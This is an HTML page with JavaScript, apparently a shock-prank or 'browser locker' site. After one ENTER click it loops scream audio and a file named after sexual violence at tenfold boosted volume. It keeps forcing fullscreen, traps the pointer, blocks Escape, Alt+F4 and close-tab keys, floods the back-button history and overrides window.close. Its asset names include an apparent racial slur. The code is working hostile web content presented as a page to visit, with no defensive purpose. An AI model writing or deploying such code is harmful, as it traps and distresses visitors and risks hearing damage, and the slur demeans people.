<!DOCTYPE html>
<html>
<head>
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-149452514-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'UA-149452514-1');
</script>

<link rel="stylesheet" type="text/css" href="styles.css">

<meta http-equiv="Cache-Control" content="no-cache, no-store, must-validate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

<style>
* { 
    padding: 0; 
    margin: 0; 
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
}

body, html {
    overflow: hidden;
    height: 100%;
    width: 100%;
    background: #000;
    cursor: none;
}

.video-container {
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 1280px;
    height: 480px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    z-index: 1000;
}

.video-wrapper {
    width: 640px;
    height: 480px;
    position: relative;
}

#fart, #ronnie {
    width: 100%;
    height: 100%;
    object-fit: contain;
    position: absolute;
    top: 0;
}

#fart { left: 0; }
#ronnie { right: 0; }

.video-divider {
    width: 2px;
    height: 480px;
    background: red;
    position: absolute;
    left: 50%;
    transform: translateX(-50%);
}

.click-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    z-index: 9999999;
    cursor: pointer;
    display: flex;
    justify-content: center;
    align-items: center;
}

.click-overlay button {
    padding: 20px 40px;
    font-size: 20px;
    background: #fff;
    color: #000;
    border: none;
    border-radius: 0;
    cursor: pointer;
}

.black-screen {
    background-color: black;
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    z-index: 9999998;
}

.backg {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 1;
}

.backg img {
    width: 100%;
    height: 100%;
    object-fit: cover;
    opacity: 0.3;
}
</style>
</head>
<body>

<div class="click-overlay">
    <button onclick="forceFullscreenAndPlay()">ENTER</button>
</div>
<div class="black-screen"></div>

<audio id="shart" preload="auto" loop src="scream.mp3"></audio>
<audio id="shart2" preload="auto" loop src="scream.mp3"></audio>
<audio id="shart3" preload="auto" loop src="rape.mp3"></audio>

<div class="video-container">
    <div class="video-wrapper">
        <video id="fart" loop src="zzart.mp4" playsinline></video>
    </div>
    <div class="video-divider"></div>
    <div class="video-wrapper">
        <video id="ronnie" loop src="ronnie.mp4" playsinline></video>
    </div>
</div>

<div class="backg"><img src="naggars.gif"></div>

<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
<script>
(function() {
    let hasTriggered = false;
    const ORIGINAL_WIDTH = 640;
    const ORIGINAL_HEIGHT = 480;

    // --- AGGRESSIVE KEYBOARD LOCKDOWN ---
    // Block all key combinations that could exit or close the window
    document.addEventListener('keydown', function(e) {
        // Block F11 (fullscreen toggle)
        if (e.key === 'F11') {
            e.preventDefault();
            e.stopPropagation();
            return false;
        }
        // Block Alt+F4 (close window) â€” may not work in all browsers but we try
        if (e.altKey && e.key === 'F4') {
            e.preventDefault();
            e.stopPropagation();
            // Re-engage fullscreen and pointer lock
            attemptFullscreen();
            document.body.requestPointerLock();
            return false;
        }
        // Block Ctrl+W (close tab)
        if (e.ctrlKey && e.key === 'w') {
            e.preventDefault();
            e.stopPropagation();
            return false;
        }
        // Block Ctrl+Q (quit browser on some systems)
        if (e.ctrlKey && e.key === 'q') {
            e.preventDefault();
            e.stopPropagation();
            return false;
        }
        // Block Ctrl+Shift+W (close window)
        if (e.ctrlKey && e.shiftKey && e.key === 'W') {
            e.preventDefault();
            e.stopPropagation();
            return false;
        }
        // Block Alt+Tab? not possible, but we can try to refocus
        // Block Esc (often exits fullscreen)
        if (e.key === 'Escape') {
            e.preventDefault();
            e.stopPropagation();
            attemptFullscreen(); // force back
            return false;
        }
        // Block any other potential escape keys
        e.preventDefault();
        e.stopPropagation();
        return false;
    }, true);

    // --- FULLSCREEN LOCK: Re-enter immediately if user exits ---
    document.addEventListener('fullscreenchange', () => {
        if (!document.fullscreenElement && hasTriggered) {
            attemptFullscreen();
        }
    });
    document.addEventListener('webkitfullscreenchange', () => {
        if (!document.webkitFullscreenElement && hasTriggered) {
            attemptFullscreen();
        }
    });
    document.addEventListener('mozfullscreenchange', () => {
        if (!document.mozFullScreenElement && hasTriggered) {
            attemptFullscreen();
        }
    });
    document.addEventListener('MSFullscreenChange', () => {
        if (!document.msFullscreenElement && hasTriggered) {
            attemptFullscreen();
        }
    });

    // --- VISIBILITY LOCK: If tab becomes hidden, try to bring it back (limited) ---
    document.addEventListener('visibilitychange', () => {
        if (document.hidden && hasTriggered) {
            // Attempt to refocus by opening a dummy pop-under? Not reliable.
            // Instead, we just force fullscreen again when visible.
        }
    });

    // --- NAVIGATION LOCK: Flood history to break back button ---
    function floodHistory() {
        for (let i = 0; i < 20; i++) {
            history.pushState(null, null, location.href);
        }
    }
    
    window.onpopstate = function() {
        floodHistory();
        // Also re-engage fullscreen
        attemptFullscreen();
    };

    // --- WINDOW CLOSE CONFIRMATION (makes it annoying to close) ---
    window.onbeforeunload = function() {
        return "Are you absolutely sure you want to leave?";
    };

    // --- FULLSCREEN REQUEST FUNCTION (aggressive) ---
    function attemptFullscreen() {
        const elem = document.documentElement;
        if (elem.requestFullscreen) elem.requestFullscreen();
        else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
        else if (elem.mozRequestFullScreen) elem.mozRequestFullScreen();
        else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
    }

    // --- POINTER LOCK (keeps mouse trapped) ---
    function lockPointer() {
        if (document.body.requestPointerLock) {
            document.body.requestPointerLock();
        }
    }

    // --- AUDIO BOOST using Web Audio API (volume > 1.0) ---
    let audioContext;
    let gainNode;
    const audioElements = [];

    function initAudioBoost() {
        // Create AudioContext (must be resumed after user gesture)
        audioContext = new (window.AudioContext || window.webkitAudioContext)();
        gainNode = audioContext.createGain();
        gainNode.gain.value = 10; // 10x volume (may distort, but it's LOUD)
        gainNode.connect(audioContext.destination);

        // Connect each audio element to the gain node
        const audioIds = ['shart', 'shart2', 'shart3'];
        audioIds.forEach(id => {
            const el = document.getElementById(id);
            if (el) {
                audioElements.push(el);
                // Create media element source
                const source = audioContext.createMediaElementSource(el);
                source.connect(gainNode);
                // Ensure it loops and unmuted
                el.loop = true;
                el.muted = false;
                // Note: source must be connected before play()
            }
        });

        // Also handle video elements if they have audio tracks
        const videoIds = ['fart', 'ronnie'];
        videoIds.forEach(id => {
            const el = document.getElementById(id);
            if (el) {
                audioElements.push(el);
                const source = audioContext.createMediaElementSource(el);
                source.connect(gainNode);
                el.loop = true;
                el.muted = false;
            }
        });
    }

    // --- PLAY ALL MEDIA AT MAX VOLUME ---
    function playAllMedia() {
        // Resume AudioContext if suspended
        if (audioContext && audioContext.state === 'suspended') {
            audioContext.resume();
        }

        // Play all audio/video elements
        audioElements.forEach(m => {
            if (m) {
                m.volume = 1.0; // fallback
                m.muted = false;
                const playPromise = m.play();
                if (playPromise !== undefined) {
                    playPromise.catch(() => {
                        // Retry loop if browser blocks autoplay
                        setInterval(() => m.play(), 100);
                    });
                }
            }
        });
    }

    // --- MAIN ENTRY POINT ---
    window.forceFullscreenAndPlay = function() {
        if (hasTriggered) return; // prevent double execution
        hasTriggered = true;

        // Hide overlays
        const overlay = document.querySelector('.click-overlay');
        const blackScreen = document.querySelector('.black-screen');
        if (overlay) overlay.style.display = 'none';
        if (blackScreen) blackScreen.style.display = 'none';

        // Flood history
        floodHistory();

        // Initialize audio boost (must be called after user interaction)
        initAudioBoost();

        // Play all media
        playAllMedia();

        // Aggressive fullscreen loop (every 500ms)
        attemptFullscreen();
        setInterval(attemptFullscreen, 500);

        // Pointer lock loop
        lockPointer();
        setInterval(lockPointer, 500);

        // Also attempt to lock on any click
        document.addEventListener('click', lockPointer);
    };

    // --- RESIZE LOGIC (unchanged) ---
    function resizeVideos() {
        const videoContainer = document.querySelector('.video-container');
        if (videoContainer) {
            videoContainer.style.width = (ORIGINAL_WIDTH * 2 + 20) + 'px';
            videoContainer.style.height = ORIGINAL_HEIGHT + 'px';
        }
    }

    window.addEventListener('load', () => {
        resizeVideos();
        setInterval(resizeVideos, 2000);
    });

    // --- ADDITIONAL TRAPS ---
    // Disable context menu (already there)
    document.addEventListener('contextmenu', e => e.preventDefault(), true);

    // Block drag events (sometimes used to exit)
    document.addEventListener('dragstart', e => e.preventDefault(), true);

    // Block selection attempts
    document.addEventListener('selectstart', e => e.preventDefault(), true);

    // If the user somehow manages to click on a link (none exist), but still
    document.addEventListener('click', e => {
        if (hasTriggered) {
            e.preventDefault();
            e.stopPropagation();
            attemptFullscreen();
            lockPointer();
        }
    }, true);

    // Prevent window blur from allowing escape? Not possible.
    // But we can re-request focus when window loses focus? Not allowed.

    // Override window.close to prevent scripted closing
    window.close = function() {
        console.warn('Nice try.');
    };

})();
</script>
</body>
</html>
